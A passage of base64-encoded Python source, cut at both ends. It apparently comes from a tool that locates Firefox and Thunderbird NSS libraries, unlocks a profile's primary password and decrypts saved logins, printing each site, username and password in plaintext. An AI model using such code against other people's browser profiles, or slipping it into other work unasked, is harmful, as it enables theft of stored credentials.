xQcm9ncmFtI
EZpbGVzXFxNb3ppbGxhIEZpcmVmb3giLAogICAgICAgICAgICAiQzpcXFByb2dyYW0gRmlsZXNcXEZpcmVmb3ggRGV2ZWxvcGVyIEVkaXRpb24iLAogICAgICAgICAgICAiQzpcXFByb2dyYW0gRmlsZXNcXE1vemlsbGEgVGh1bmRlcmJpcmQiLAogICAgICAgICAgICAiQzpcXFByb2dyYW0gRmlsZXNcXE5pZ2h0bHkiLAogICAgICAgICAgICAiQzpcXFByb2dyYW0gRmlsZXNcXFNlYU1vbmtleSIsCiAgICAgICAgICAgICJDOlxcUHJvZ3JhbSBGaWxlc1xcV2F0ZXJmb3giLAogICAgICAgIF0KICAgICAgICBpZiBub3QgU1lTNjQ6CiAgICAgICAgICAgIGxvY2F0aW9ucyA9IFsKICAgICAgICAgICAgICAgICIiLCAgIyBDdXJyZW50IGRpcmVjdG9yeSBvciBzeXN0ZW0gbGliIGZpbmRlcgogICAgICAgICAgICAgICAgIkM6XFxQcm9ncmFtIEZpbGVzICh4ODYpXFxNb3ppbGxhIEZpcmVmb3giLAogICAgICAgICAgICAgICAgIkM6XFxQcm9ncmFtIEZpbGVzICh4ODYpXFxGaXJlZm94IERldmVsb3BlciBFZGl0aW9uIiwKICAgICAgICAgICAgICAgICJDOlxcUHJvZ3JhbSBGaWxlcyAoeDg2KVxcTW96aWxsYSBUaHVuZGVyYmlyZCIsCiAgICAgICAgICAgICAgICAiQzpcXFByb2dyYW0gRmlsZXMgKHg4NilcXE5pZ2h0bHkiLAogICAgICAgICAgICAgICAgIkM6XFxQcm9ncmFtIEZpbGVzICh4ODYpXFxTZWFNb25rZXkiLAogICAgICAgICAgICAgICAgIkM6XFxQcm9ncmFtIEZpbGVzICh4ODYpXFxXYXRlcmZveCIsCiAgICAgICAgICAgIF0gKyBsb2NhdGlvbnMKCiAgICAgICAgIyBJZiBlaXRoZXIgb2YgdGhlIHN1cHBvcnRlZCBzb2Z0d2FyZSBpcyBpbiBQQVRIIHRyeSB0byB1c2UgaXQKICAgICAgICBzb2Z0d2FyZSA9IFsiZmlyZWZveCIsICJ0aHVuZGVyYmlyZCIsICJ3YXRlcmZveCIsICJzZWFtb25rZXkiXQogICAgICAgIGZvciBiaW5hcnkgaW4gc29mdHdhcmU6CiAgICAgICAgICAgIGxvY2F0aW9uOiBPcHRpb25hbFtzdHJdID0gc2h1dGlsLndoaWNoKGJpbmFyeSkKICAgICAgICAgICAgaWYgbG9jYXRpb24gaXMgbm90IE5vbmU6CiAgICAgICAgICAgICAgICBuc3Nsb2NhdGlvbjogc3RyID0gb3MucGF0aC5qb2luKG9zLnBhdGguZGlybmFtZShsb2NhdGlvbiksIG5zc25hbWUpCiAgICAgICAgICAgICAgICBsb2NhdGlvbnMuYXBwZW5kKG5zc2xvY2F0aW9uKQoKICAgIGVsaWYgU1lTVEVNID09ICJEYXJ3aW4iOgogICAgICAgIG5zc25hbWUgPSAibGlibnNzMy5keWxpYiIKICAgICAgICBsb2NhdGlvbnMgPSAoCiAgICAgICAgICAgICIiLCAgIyBDdXJyZW50IGRpcmVjdG9yeSBvciBzeXN0ZW0gbGliIGZpbmRlcgogICAgICAgICAgICAiL3Vzci9sb2NhbC9saWIvbnNzIiwKICAgICAgICAgICAgIi91c3IvbG9jYWwvbGliIiwKICAgICAgICAgICAgIi9vcHQvbG9jYWwvbGliL25zcyIsCiAgICAgICAgICAgICIvc3cvbGliL2ZpcmVmb3giLAogICAgICAgICAgICAiL3N3L2xpYi9tb3ppbGxhIiwKICAgICAgICAgICAgIi91c3IvbG9jYWwvb3B0L25zcy9saWIiLCAgIyBuc3MgaW5zdGFsbGVkIHdpdGggQnJldyBvbiBEYXJ3aW4KICAgICAgICAgICAgIi9vcHQvcGtnL2xpYi9uc3MiLCAgIyBpbnN0YWxsZWQgdmlhIHBrZ3NyYwogICAgICAgICAgICAiL0FwcGxpY2F0aW9ucy9GaXJlZm94LmFwcC9Db250ZW50cy9NYWNPUyIsICAjIGRlZmF1bHQgbWFudWFsIGluc3RhbGwgbG9jYXRpb24KICAgICAgICAgICAgIi9BcHBsaWNhdGlvbnMvVGh1bmRlcmJpcmQuYXBwL0NvbnRlbnRzL01hY09TIiwKICAgICAgICAgICAgIi9BcHBsaWNhdGlvbnMvU2VhTW9ua2V5LmFwcC9Db250ZW50cy9NYWNPUyIsCiAgICAgICAgICAgICIvQXBwbGljYXRpb25zL1dhdGVyZm94LmFwcC9Db250ZW50cy9NYWNPUyIsCiAgICAgICAgKQoKICAgIGVsc2U6CiAgICAgICAgbnNzbmFtZSA9ICJsaWJuc3MzLnNvIgogICAgICAgIGlmIFNZUzY0OgogICAgICAgICAgICBsb2NhdGlvbnMgPSAoCiAgICAgICAgICAgICAgICAiIiwgICMgQ3VycmVudCBkaXJlY3Rvcnkgb3Igc3lzdGVtIGxpYiBmaW5kZXIKICAgICAgICAgICAgICAgICIvdXNyL2xpYjY0IiwKICAgICAgICAgICAgICAgICIvdXNyL2xpYjY0L25zcyIsCiAgICAgICAgICAgICAgICAiL3Vzci9saWIiLAogICAgICAgICAgICAgICAgIi91c3IvbGliL25zcyIsCiAgICAgICAgICAgICAgICAiL3Vzci9sb2NhbC9saWIiLAogICAgICAgICAgICAgICAgIi91c3IvbG9jYWwvbGliL25zcyIsCiAgICAgICAgICAgICAgICAiL29wdC9sb2NhbC9saWIiLAogICAgICAgICAgICAgICAgIi9vcHQvbG9jYWwvbGliL25zcyIsCiAgICAgICAgICAgICAgICBvcy5wYXRoLmV4cGFuZHVzZXIoIn4vLm5peC1wcm9maWxlL2xpYiIpLAogICAgICAgICAgICApCiAgICAgICAgZWxzZToKICAgICAgICAgICAgbG9jYXRpb25zID0gKAogICAgICAgICAgICAgICAgIiIsICAjIEN1cnJlbnQgZGlyZWN0b3J5IG9yIHN5c3RlbSBsaWIgZmluZGVyCiAgICAgICAgICAgICAgICAiL3Vzci9saWIiLAogICAgICAgICAgICAgICAgIi91c3IvbGliL25zcyIsCiAgICAgICAgICAgICAgICAiL3Vzci9saWIzMiIsCiAgICAgICAgICAgICAgICAiL3Vzci9saWIzMi9uc3MiLAogICAgICAgICAgICAgICAgIi91c3IvbGliNjQiLAogICAgICAgICAgICAgICAgIi91c3IvbGliNjQvbnNzIiwKICAgICAgICAgICAgICAgICIvdXNyL2xvY2FsL2xpYiIsCiAgICAgICAgICAgICAgICAiL3Vzci9sb2NhbC9saWIvbnNzIiwKICAgICAgICAgICAgICAgICIvb3B0L2xvY2FsL2xpYiIsCiAgICAgICAgICAgICAgICAiL29wdC9sb2NhbC9saWIvbnNzIiwKICAgICAgICAgICAgICAgIG9zLnBhdGguZXhwYW5kdXNlcigifi8ubml4LXByb2ZpbGUvbGliIiksCiAgICAgICAgICAgICkKCiAgICAjIElmIHRoaXMgc3VjY2VlZHMgbGlibnNzIHdhcyBsb2FkZWQKICAgIHJldHVybiBmaW5kX25zcyhsb2NhdGlvbnMsIG5zc25hbWUpCgoKY2xhc3MgY19jaGFyX3BfZnJvbXN0cihjdC5jX2NoYXJfcCk6CiAgICAiIiJjdHlwZXMgY2hhcl9wIG92ZXJyaWRlIHRoYXQgaGFuZGxlcyBlbmNvZGluZyBzdHIgdG8gYnl0ZXMiIiIKCiAgICBkZWYgZnJvbV9wYXJhbShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5lbmNvZGUoREVGQVVMVF9FTkNPRElORykKCgpjbGFzcyBOU1NQcm94eToKICAgIGNsYXNzIFNFQ0l0ZW0oY3QuU3RydWN0dXJlKToKICAgICAgICAiIiJzdHJ1Y3QgbmVlZGVkIHRvIGludGVyYWN0IHdpdGggbGlibnNzIiIiCgogICAgICAgIF9maWVsZHNfID0gWwogICAgICAgICAgICAoInR5cGUiLCBjdC5jX3VpbnQpLAogICAgICAgICAgICAoImRhdGEiLCBjdC5jX2NoYXJfcCksICAjIGFjdHVhbGx5OiB1bnNpZ25lZCBjaGFyICoKICAgICAgICAgICAgKCJsZW4iLCBjdC5jX3VpbnQpLAogICAgICAgIF0KCiAgICAgICAgZGVmIGRlY29kZV9kYXRhKHNlbGYpOgogICAgICAgICAgICBfYnl0ZXMgPSBjdC5zdHJpbmdfYXQoc2VsZi5kYXRhLCBzZWxmLmxlbikKICAgICAgICAgICAgcmV0dXJuIF9ieXRlcy5kZWNvZGUoREVGQVVMVF9FTkNPRElORykKCiAgICBjbGFzcyBQSzExU2xvdEluZm8oY3QuU3RydWN0dXJlKToKICAgICAgICAiIiJPcGFxdWUgc3RydWN0dXJlIHJlcHJlc2VudGluZyBhIGxvZ2ljYWwgUEtDUyBzbG90IiIiCgogICAgZGVmIF9faW5pdF9fKHNlbGYsIG5vbl9mYXRhbF9kZWNyeXB0aW9uPUZhbHNlKToKICAgICAgICAjIExvY2F0ZSBsaWJuc3MgYW5kIHRyeSBsb2FkaW5nIGl0CiAgICAgICAgc2VsZi5saWJuc3MgPSBsb2FkX2xpYm5zcygpCiAgICAgICAgc2VsZi5ub25fZmF0YWxfZGVjcnlwdGlvbiA9IG5vbl9mYXRhbF9kZWNyeXB0aW9uCgogICAgICAgIFNsb3RJbmZvUHRyID0gY3QuUE9JTlRFUihzZWxmLlBLMTFTbG90SW5mbykKICAgICAgICBTRUNJdGVtUHRyID0gY3QuUE9JTlRFUihzZWxmLlNFQ0l0ZW0pCgogICAgICAgIHNlbGYuX3NldF9jdHlwZXMoY3QuY19pbnQsICJOU1NfSW5pdCIsIGNfY2hhcl9wX2Zyb21zdHIpCiAgICAgICAgc2VsZi5fc2V0X2N0eXBlcyhjdC5jX2ludCwgIk5TU19TaHV0ZG93biIpCiAgICAgICAgc2VsZi5fc2V0X2N0eXBlcyhTbG90SW5mb1B0ciwgIlBLMTFfR2V0SW50ZXJuYWxLZXlTbG90IikKICAgICAgICBzZWxmLl9zZXRfY3R5cGVzKE5vbmUsICJQSzExX0ZyZWVTbG90IiwgU2xvdEluZm9QdHIpCiAgICAgICAgc2VsZi5fc2V0X2N0eXBlcyhjdC5jX2ludCwgIlBLMTFfTmVlZExvZ2luIiwgU2xvdEluZm9QdHIpCiAgICAgICAgc2VsZi5fc2V0X2N0eXBlcygKICAgICAgICAgICAgY3QuY19pbnQsICJQSzExX0NoZWNrVXNlclBhc3N3b3JkIiwgU2xvdEluZm9QdHIsIGNfY2hhcl9wX2Zyb21zdHIKICAgICAgICApCiAgICAgICAgc2VsZi5fc2V0X2N0eXBlcygKICAgICAgICAgICAgY3QuY19pbnQsICJQSzExU0RSX0RlY3J5cHQiLCBTRUNJdGVtUHRyLCBTRUNJdGVtUHRyLCBjdC5jX3ZvaWRfcAogICAgICAgICkKICAgICAgICBzZWxmLl9zZXRfY3R5cGVzKE5vbmUsICJTRUNJVEVNX1pmcmVlSXRlbSIsIFNFQ0l0ZW1QdHIsIGN0LmNfaW50KQoKICAgICAgICAjIGZvciBlcnJvciBoYW5kbGluZwogICAgICAgIHNlbGYuX3NldF9jdHlwZXMoY3QuY19pbnQsICJQT1JUX0dldEVycm9yIikKICAgICAgICBzZWxmLl9zZXRfY3R5cGVzKGN0LmNfY2hhcl9wLCAiUFJfRXJyb3JUb05hbWUiLCBjdC5jX2ludCkKICAgICAgICBzZWxmLl9zZXRfY3R5cGVzKGN0LmNfY2hhcl9wLCAiUFJfRXJyb3JUb1N0cmluZyIsIGN0LmNfaW50LCBjdC5jX3VpbnQzMikKCiAgICBkZWYgX3NldF9jdHlwZXMoc2VsZiwgcmVzdHlwZSwgbmFtZSwgKmFyZ3R5cGVzKToKICAgICAgICAiIiJTZXQgaW5wdXQvb3V0cHV0IHR5cGVzIG9uIGxpYm5zcyBDIGZ1bmN0aW9ucyBmb3IgYXV0b21hdGljIHR5cGUgY2FzdGluZyIiIgogICAgICAgIHJlcyA9IGdldGF0dHIoc2VsZi5saWJuc3MsIG5hbWUpCiAgICAgICAgcmVzLmFyZ3R5cGVzID0gYXJndHlwZXMKICAgICAgICByZXMucmVzdHlwZSA9IHJlc3R5cGUKCiAgICAgICAgIyBUcmFuc3BhcmVudGx5IGhhbmRsZSBkZWNvZGluZyB0byBzdHJpbmcgd2hlbiByZXR1cm5pbmcgYSBjX2NoYXJfcAogICAgICAgIGlmIHJlc3R5cGUgPT0gY3QuY19jaGFyX3A6CgogICAgICAgICAgICBkZWYgX2RlY29kZShyZXN1bHQsIGZ1bmMsICphcmdzKToKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0LmRlY29kZShERUZBVUxUX0VOQ09ESU5HKQogICAgICAgICAgICAgICAgZXhjZXB0IEF0dHJpYnV0ZUVycm9yOgogICAgICAgICAgICAgICAgICAgIHJldHVybiByZXN1bHQKCiAgICAgICAgICAgIHJlcy5lcnJjaGVjayA9IF9kZWNvZGUKCiAgICAgICAgc2V0YXR0cihzZWxmLCAiXyIgKyBuYW1lLCByZXMpCgogICAgZGVmIGluaXRpYWxpemUoc2VsZiwgcHJvZmlsZTogc3RyKToKICAgICAgICAjIFRoZSBzcWw6IHByZWZpeCBlbnN1cmVzIGNvbXBhdGliaWxpdHkgd2l0aCBib3RoCiAgICAgICAgIyBCZXJrbGV5IERCIChjZXJ0OCkgYW5kIFNxbGl0ZSAoY2VydDkpIGRicwogICAgICAgIHByb2ZpbGVfcGF0aCA9ICJzcWw6IiArIHByb2ZpbGUKICAgICAgICBMT0cuZGVidWcoIkluaXRpYWxpemluZyBOU1Mgd2l0aCBwcm9maWxlICclcyciLCBwcm9maWxlX3BhdGgpCiAgICAgICAgZXJyX3N0YXR1czogaW50ID0gc2VsZi5fTlNTX0luaXQocHJvZmlsZV9wYXRoKQogICAgICAgIExPRy5kZWJ1ZygiSW5pdGlhbGl6aW5nIE5TUyByZXR1cm5lZCAlcyIsIGVycl9zdGF0dXMpCgogICAgICAgIGlmIGVycl9zdGF0dXM6CiAgICAgICAgICAgIHNlbGYuaGFuZGxlX2Vycm9yKAogICAgICAgICAgICAgICAgRXhpdC5GQUlMX0lOSVRfTlNTLAogICAgICAgICAgICAgICAgIkNvdWxkbid0IGluaXRpYWxpemUgTlNTLCBtYXliZSAnJXMnIGlzIG5vdCBhIHZhbGlkIHByb2ZpbGU/IiwKICAgICAgICAgICAgICAgIHByb2ZpbGUsCiAgICAgICAgICAgICkKCiAgICBkZWYgc2h1dGRvd24oc2VsZik6CiAgICAgICAgZXJyX3N0YXR1czogaW50ID0gc2VsZi5fTlNTX1NodXRkb3duKCkKCiAgICAgICAgaWYgZXJyX3N0YXR1czoKICAgICAgICAgICAgc2VsZi5oYW5kbGVfZXJyb3IoCiAgICAgICAgICAgICAgICBFeGl0LkZBSUxfU0hVVERPV05fTlNTLAogICAgICAgICAgICAgICAgIkNvdWxkbid0IHNodXRkb3duIGN1cnJlbnQgTlNTIHByb2ZpbGUiLAogICAgICAgICAgICApCgogICAgZGVmIGF1dGhlbnRpY2F0ZShzZWxmLCBwcm9maWxlLCBpbnRlcmFjdGl2ZSk6CiAgICAgICAgIiIiVW5sb2NrcyB0aGUgcHJvZmlsZSBpZiBuZWNlc3NhcnksIGluIHdoaWNoIGNhc2UgYSBwYXNzd29yZAogICAgICAgIHdpbGwgcHJvbXB0ZWQgdG8gdGhlIHVzZXIuCiAgICAgICAgIiIiCiAgICAgICAgTE9HLmRlYnVnKCJSZXRyaWV2aW5nIGludGVybmFsIGtleSBzbG90IikKICAgICAgICBrZXlzbG90ID0gc2VsZi5fUEsxMV9HZXRJbnRlcm5hbEtleVNsb3QoKQoKICAgICAgICBMT0cuZGVidWcoIkludGVybmFsIGtleSBzbG90ICVzIiwga2V5c2xvdCkKICAgICAgICBpZiBub3Qga2V5c2xvdDoKICAgICAgICAgICAgc2VsZi5oYW5kbGVfZXJyb3IoCiAgICAgICAgICAgICAgICBFeGl0LkZBSUxfTlNTX0tFWVNMT1QsCiAgICAgICAgICAgICAgICAiRmFpbGVkIHRvIHJldHJpZXZlIGludGVybmFsIEtleVNsb3QiLAogICAgICAgICAgICApCgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgc2VsZi5fUEsxMV9OZWVkTG9naW4oa2V5c2xvdCk6CiAgICAgICAgICAgICAgICBwYXNzd29yZDogc3RyID0gYXNrX3Bhc3N3b3JkKHByb2ZpbGUsIGludGVyYWN0aXZlKQoKICAgICAgICAgICAgICAgIExPRy5kZWJ1ZygiQXV0aGVudGljYXRpbmcgd2l0aCBwYXNzd29yZCAnJXMnIiwgcGFzc3dvcmQpCiAgICAgICAgICAgICAgICBlcnJfc3RhdHVzOiBpbnQgPSBzZWxmLl9QSzExX0NoZWNrVXNlclBhc3N3b3JkKGtleXNsb3QsIHBhc3N3b3JkKQoKICAgICAgICAgICAgICAgIExPRy5kZWJ1ZygiQ2hlY2tpbmcgdXNlciBwYXNzd29yZCByZXR1cm5lZCAlcyIsIGVycl9zdGF0dXMpCgogICAgICAgICAgICAgICAgaWYgZXJyX3N0YXR1czoKICAgICAgICAgICAgICAgICAgICBzZWxmLmhhbmRsZV9lcnJvcigKICAgICAgICAgICAgICAgICAgICAgICAgRXhpdC5CQURfUFJJTUFSWV9QQVNTV09SRCwKICAgICAgICAgICAgICAgICAgICAgICAgIlByaW1hcnkgcGFzc3dvcmQgaXMgbm90IGNvcnJlY3QiLAogICAgICAgICAgICAgICAgICAgICkKCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBMT0cuaW5mbygiTm8gUHJpbWFyeSBQYXNzd29yZCBmb3VuZCAtIG5vIGF1dGhlbnRpY2F0aW9uIG5lZWRlZCIpCiAgICAgICAgZmluYWxseToKICAgICAgICAgICAgIyBBdm9pZCBsZWFraW5nIFBLMTFLZXlTbG90CiAgICAgICAgICAgIHNlbGYuX1BLMTFfRnJlZVNsb3Qoa2V5c2xvdCkKCiAgICBkZWYgaGFuZGxlX2Vycm9yKHNlbGYsIGV4
aXRjb2RlOiBpbnQsICpsb2dlcnJvcjogQW55KToKICAgICAgICAiIiJJZiBhbiBlcnJvciBoYXBwZW5zIGluIGxpYm5zcywgaGFuZGxlIGl0IGFuZCBwcmludCBzb21lIGRlYnVnIGluZm9ybWF0aW9uIiIiCiAgICAgICAgaWYgbG9nZXJyb3I6CiAgICAgICAgICAgIExPRy5lcnJvcigqbG9nZXJyb3IpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgTE9HLmRlYnVnKCJFcnJvciBkdXJpbmcgYSBjYWxsIHRvIE5TUyBsaWJyYXJ5LCB0cnlpbmcgdG8gb2J0YWluIGVycm9yIGluZm8iKQoKICAgICAgICBjb2RlID0gc2VsZi5fUE9SVF9HZXRFcnJvcigpCiAgICAgICAgbmFtZSA9IHNlbGYuX1BSX0Vycm9yVG9OYW1lKGNvZGUpCiAgICAgICAgbmFtZSA9ICJOVUxMIiBpZiBuYW1lIGlzIE5vbmUgZWxzZSBuYW1lCiAgICAgICAgIyAwIGlzIHRoZSBkZWZhdWx0IGxhbmd1YWdlIChsb2NhbGl6YXRpb24gcmVsYXRlZCkKICAgICAgICB0ZXh0ID0gc2VsZi5fUFJfRXJyb3JUb1N0cmluZyhjb2RlLCAwKQoKICAgICAgICBMT0cuZGVidWcoIiVzOiAlcyIsIG5hbWUsIHRleHQpCgogICAgICAgIHJhaXNlIEV4aXQoZXhpdGNvZGUpCgogICAgZGVmIGRlY3J5cHQoc2VsZiwgZGF0YTY0KToKICAgICAgICBkYXRhID0gYjY0ZGVjb2RlKGRhdGE2NCkKICAgICAgICBpbnAgPSBzZWxmLlNFQ0l0ZW0oMCwgZGF0YSwgbGVuKGRhdGEpKQogICAgICAgIG91dCA9IHNlbGYuU0VDSXRlbSgwLCBOb25lLCAwKQoKICAgICAgICBlcnJfc3RhdHVzOiBpbnQgPSBzZWxmLl9QSzExU0RSX0RlY3J5cHQoaW5wLCBvdXQsIE5vbmUpCiAgICAgICAgTE9HLmRlYnVnKCJEZWNyeXB0aW9uIG9mIGRhdGEgcmV0dXJuZWQgJXMiLCBlcnJfc3RhdHVzKQogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgZXJyX3N0YXR1czogICMgLTEgbWVhbnMgcGFzc3dvcmQgZmFpbGVkLCBvdGhlciBzdGF0dXMgYXJlIHVua25vd24KICAgICAgICAgICAgICAgIGVycm9yX21zZyA9ICgKICAgICAgICAgICAgICAgICAgICAiVXNlcm5hbWUvUGFzc3dvcmQgZGVjcnlwdGlvbiBmYWlsZWQuICIKICAgICAgICAgICAgICAgICAgICAiQ3JlZGVudGlhbHMgZGFtYWdlZCBvciBjZXJ0L2tleSBmaWxlIG1pc21hdGNoLiIKICAgICAgICAgICAgICAgICkKCiAgICAgICAgICAgICAgICBpZiBzZWxmLm5vbl9mYXRhbF9kZWNyeXB0aW9uOgogICAgICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoZXJyb3JfbXNnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBzZWxmLmhhbmRsZV9lcnJvcihFeGl0LkRFQ1JZUFRJT05fRkFJTEVELCBlcnJvcl9tc2cpCgogICAgICAgICAgICByZXMgPSBvdXQuZGVjb2RlX2RhdGEoKQogICAgICAgIGZpbmFsbHk6CiAgICAgICAgICAgICMgQXZvaWQgbGVha2luZyBTRUNJdGVtCiAgICAgICAgICAgIHNlbGYuX1NFQ0lURU1fWmZyZWVJdGVtKG91dCwgMCkKCiAgICAgICAgcmV0dXJuIHJlcwoKCmNsYXNzIE1vemlsbGFJbnRlcmFjdGlvbjoKICAgICIiIgogICAgQWJzdHJhY3Rpb24gaW50ZXJmYWNlIHRvIE1vemlsbGEgcHJvZmlsZSBhbmQgbGliIE5TUwogICAgIiIiCgogICAgZGVmIF9faW5pdF9fKHNlbGYsIG5vbl9mYXRhbF9kZWNyeXB0aW9uPUZhbHNlKToKICAgICAgICBzZWxmLnByb2ZpbGUgPSBOb25lCiAgICAgICAgc2VsZi5wcm94eSA9IE5TU1Byb3h5KG5vbl9mYXRhbF9kZWNyeXB0aW9uKQoKICAgIGRlZiBsb2FkX3Byb2ZpbGUoc2VsZiwgcHJvZmlsZSk6CiAgICAgICAgIiIiSW5pdGlhbGl6ZSB0aGUgTlNTIGxpYnJhcnkgYW5kIHByb2ZpbGUiIiIKICAgICAgICBzZWxmLnByb2ZpbGUgPSBwcm9maWxlCiAgICAgICAgc2VsZi5wcm94eS5pbml0aWFsaXplKHNlbGYucHJvZmlsZSkKCiAgICBkZWYgYXV0aGVudGljYXRlKHNlbGYsIGludGVyYWN0aXZlKToKICAgICAgICAiIiJBdXRoZW50aWNhdGUgdGhlIHRoZSBjdXJyZW50IHByb2ZpbGUgaXMgcHJvdGVjdGVkIGJ5IGEgcHJpbWFyeSBwYXNzd29yZCwKICAgICAgICBwcm9tcHQgdGhlIHVzZXIgYW5kIHVubG9jayB0aGUgcHJvZmlsZS4KICAgICAgICAiIiIKICAgICAgICBzZWxmLnByb3h5LmF1dGhlbnRpY2F0ZShzZWxmLnByb2ZpbGUsIGludGVyYWN0aXZlKQoKICAgIGRlZiB1bmxvYWRfcHJvZmlsZShzZWxmKToKICAgICAgICAiIiJTaHV0ZG93biBOU1MgYW5kIGRlYWN0aXZhdGUgY3VycmVudCBwcm9maWxlIiIiCiAgICAgICAgc2VsZi5wcm94eS5zaHV0ZG93bigpCgogICAgZGVmIGRlY3J5cHRfcGFzc3dvcmRzKHNlbGYpIC0+IFBXU3RvcmU6CiAgICAgICAgIiIiRGVjcnlwdCByZXF1ZXN0ZWQgcHJvZmlsZSB1c2luZyB0aGUgcHJvdmlkZWQgcGFzc3dvcmQuCiAgICAgICAgUmV0dXJucyBhbGwgcGFzc3dvcmRzIGluIGEgbGlzdCBvZiBkaWN0cwogICAgICAgICIiIgogICAgICAgIGNyZWRlbnRpYWxzOiBDcmVkZW50aWFscyA9IHNlbGYub2J0YWluX2NyZWRlbnRpYWxzKCkKCiAgICAgICAgTE9HLmluZm8oIkRlY3J5cHRpbmcgY3JlZGVudGlhbHMiKQogICAgICAgIG91dHB1dHM6IFBXU3RvcmUgPSBbXQoKICAgICAgICB1cmw6IHN0cgogICAgICAgIHVzZXI6IHN0cgogICAgICAgIHBhc3N3OiBzdHIKICAgICAgICBlbmN0eXBlOiBpbnQKICAgICAgICBmb3IgdXJsLCB1c2VyLCBwYXNzdywgZW5jdHlwZSBpbiBjcmVkZW50aWFsczoKICAgICAgICAgICAgIyBlbmN0eXBlIGluZm9ybXMgaWYgcGFzc3dvcmRzIG5lZWQgdG8gYmUgZGVjcnlwdGVkCiAgICAgICAgICAgIGlmIGVuY3R5cGU6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgTE9HLmRlYnVnKCJEZWNyeXB0aW5nIHVzZXJuYW1lIGRhdGEgJyVzJyIsIHVzZXIpCiAgICAgICAgICAgICAgICAgICAgdXNlciA9IHNlbGYucHJveHkuZGVjcnlwdCh1c2VyKQogICAgICAgICAgICAgICAgICAgIExPRy5kZWJ1ZygiRGVjcnlwdGluZyBwYXNzd29yZCBkYXRhICclcyciLCBwYXNzdykKICAgICAgICAgICAgICAgICAgICBwYXNzdyA9IHNlbGYucHJveHkuZGVjcnlwdChwYXNzdykKICAgICAgICAgICAgICAgIGV4Y2VwdCAoVHlwZUVycm9yLCBWYWx1ZUVycm9yKSBhcyBlOgogICAgICAgICAgICAgICAgICAgIExPRy53YXJuaW5nKAogICAgICAgICAgICAgICAgICAgICAgICAiRmFpbGVkIHRvIGRlY29kZSB1c2VybmFtZSBvciBwYXNzd29yZCBmb3IgZW50cnkgZnJvbSBVUkwgJXMiLAogICAgICAgICAgICAgICAgICAgICAgICB1cmwsCiAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgIExPRy5kZWJ1ZyhlLCBleGNfaW5mbz1UcnVlKQogICAgICAgICAgICAgICAgICAgIHVzZXIgPSAiKioqIGRlY3J5cHRpb24gZmFpbGVkICoqKiIKICAgICAgICAgICAgICAgICAgICBwYXNzdyA9ICIqKiogZGVjcnlwdGlvbiBmYWlsZWQgKioqIgoKICAgICAgICAgICAgTE9HLmRlYnVnKAogICAgICAgICAgICAgICAgIkRlY29kZWQgdXNlcm5hbWUgJyVzJyBhbmQgcGFzc3dvcmQgJyVzJyBmb3Igd2Vic2l0ZSAnJXMnIiwKICAgICAgICAgICAgICAgIHVzZXIsCiAgICAgICAgICAgICAgICBwYXNzdywKICAgICAgICAgICAgICAgIHVybCwKICAgICAgICAgICAgKQoKICAgICAgICAgICAgb3V0cHV0ID0geyJ1cmwiOiB1cmwsICJ1c2VyIjogdXNlciwgInBhc3N3b3JkIjogcGFzc3d9CiAgICAgICAgICAgIG91dHB1dHMuYXBwZW5kKG91dHB1dCkKCiAgICAgICAgaWYgbm90IG91dHB1dHM6CiAgICAgICAgICAgIExPRy53YXJuaW5nKCJObyBwYXNzd29yZHMgZm91bmQgaW4gc2VsZWN0ZWQgcHJvZmlsZSIpCgogICAgICAgICMgQ2xvc2UgY3JlZGVudGlhbCBoYW5kbGVzIChTUUwpCiAgICAgICAgY3JlZGVudGlhbHMuZG9uZSgpCgogICAgICAgIHJldHVybiBvdXRwdXRzCgogICAgZGVmIG9idGFpbl9jcmVkZW50aWFscyhzZWxmKSAtPiBDcmVkZW50aWFsczoKICAgICAgICAiIiJGaWd1cmUgb3V0IHdoaWNoIG9mIHRoZSAyIHBvc3NpYmxlIGJhY2tlbmQgY3JlZGVudGlhbCBlbmdpbmVzIGlzIGF2YWlsYWJsZSIiIgogICAgICAgIGNyZWRlbnRpYWxzOiBDcmVkZW50aWFscwogICAgICAgIHRyeToKICAgICAgICAgICAgY3JlZGVudGlhbHMgPSBKc29uQ3JlZGVudGlhbHMoc2VsZi5wcm9maWxlKQogICAgICAgIGV4Y2VwdCBOb3RGb3VuZEVycm9yOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBjcmVkZW50aWFscyA9IFNxbGl0ZUNyZWRlbnRpYWxzKHNlbGYucHJvZmlsZSkKICAgICAgICAgICAgZXhjZXB0IE5vdEZvdW5kRXJyb3I6CiAgICAgICAgICAgICAgICBMT0cuZXJyb3IoCiAgICAgICAgICAgICAgICAgICAgIkNvdWxkbid0IGZpbmQgY3JlZGVudGlhbHMgZmlsZSAobG9naW5zLmpzb24gb3Igc2lnbm9ucy5zcWxpdGUpLiIKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgIHJhaXNlIEV4aXQoRXhpdC5NSVNTSU5HX1NFQ1JFVFMpCgogICAgICAgIHJldHVybiBjcmVkZW50aWFscwoKCmNsYXNzIE91dHB1dEZvcm1hdDoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBwd3N0b3JlOiBQV1N0b3JlLCBjbWRhcmdzOiBhcmdwYXJzZS5OYW1lc3BhY2UpOgogICAgICAgIHNlbGYucHdzdG9yZSA9IHB3c3RvcmUKICAgICAgICBzZWxmLmNtZGFyZ3MgPSBjbWRhcmdzCgogICAgZGVmIG91dHB1dChzZWxmKToKICAgICAgICBwYXNzCgoKY2xhc3MgSHVtYW5PdXRwdXRGb3JtYXQoT3V0cHV0Rm9ybWF0KToKICAgIGRlZiBvdXRwdXQoc2VsZik6CiAgICAgICAgZm9yIG91dHB1dCBpbiBzZWxmLnB3c3RvcmU6CiAgICAgICAgICAgIHJlY29yZDogc3RyID0gKAogICAgICAgICAgICAgICAgZiJcbldlYnNpdGU6ICAge291dHB1dFsndXJsJ119XG4iCiAgICAgICAgICAgICAgICBmIlVzZXJuYW1lOiAne291dHB1dFsndXNlciddfSdcbiIKICAgICAgICAgICAgICAgIGYiUGFzc3dvcmQ6ICd7b3V0cHV0WydwYXNz